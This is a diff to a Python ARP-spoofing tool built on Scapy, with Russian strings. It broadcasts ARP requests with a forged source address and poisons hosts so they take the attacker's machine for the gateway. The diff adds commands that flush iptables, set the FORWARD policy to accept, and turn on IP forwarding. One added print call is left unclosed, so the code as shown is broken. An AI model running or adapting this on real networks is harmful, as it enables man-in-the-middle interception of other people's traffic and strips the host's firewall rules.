@@ -375,11 +375,19 @@ def network_arp_discovery(interface="eth0", gateway_ip="", gateway_mac=""):
                 progress.update(task, description=f"[red]Отправляю ARP-запрос на  {target_ip}")
                 arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                                                   psrc=spoof_ip, hwsrc=spoof_mac)
-
-                ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
-                if gateway_ip != "":
-                    for sent, received in ans:
-                        arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)
+                sendp(arp_packet, verbose=0, count=1)
+                # ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
+                logger.info(f"Sent arp to {target_ip}")
+                # if gateway_ip != "":
+                #     for sent, received in ans:
+                #         arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)
+                #         logger.info(f"Have arp answ that {target_ip} is at {received.hwsrc}")
+                #         logger.info(f"Send spoof to {target_ip} that we are gateway {gateway_ip}")
+                #         local_ips.append(received.psrc)
+                # ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
+                # if gateway_ip != "":
+                #     for sent, received in ans:
+                #         arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)
 
                 progress.update(task, advance=1)
         os.system("clear")
@@ -390,14 +398,15 @@ def network_arp_discovery(interface="eth0", gateway_ip="", gateway_mac=""):
             arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                                               psrc=spoof_ip, hwsrc=spoof_mac)
 
-            ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
+            sendp(arp_packet, verbose=0, count=1)
+            # ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
             logger.info(f"Sent arp to {target_ip}")
-            if gateway_ip != "":
-                for sent, received in ans:
-                    arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)
-                    logger.info(f"Have arp answ that {target_ip} is at {received.hwsrc}")
-                    logger.info(f"Send spoof to {target_ip} that we are gateway {gateway_ip}")
-                    local_ips.append(received.psrc)
+            # if gateway_ip != "":
+            #     for sent, received in ans:
+            #         arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)
+            #         logger.info(f"Have arp answ that {target_ip} is at {received.hwsrc}")
+            #         logger.info(f"Send spoof to {target_ip} that we are gateway {gateway_ip}")
+            #         local_ips.append(received.psrc)
     verbose_enabled = __verbose_state
     if verbose_enabled:
         print('Press \"q\" to exit program\n')
@@ -411,6 +420,11 @@ def main():
 
     os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
     logger.info("Activated port forwarding")
+    print("Activated port forwarding")
+    os.system("iptables --flush > /dev/null")
+    os.system("iptables -P FORWARD ACCEPT > /dev/null")
+    logger.info("killed unnecessary iptables")
+    print("killed unnecessary iptables"
 
     parser = argparse.ArgumentParser(description="ARP-подделка с обнаружением новых устройств.")
     if len(sys.argv) == 1:
@@ -486,6 +500,8 @@ def main():
     for ip in old_list:
         last_spoof_time[ip] = time.time()
     logger.info(f"Studying local network gave us devices: {old_list}")
+
+    print("Program started successfully")
 
     while True:
         try:
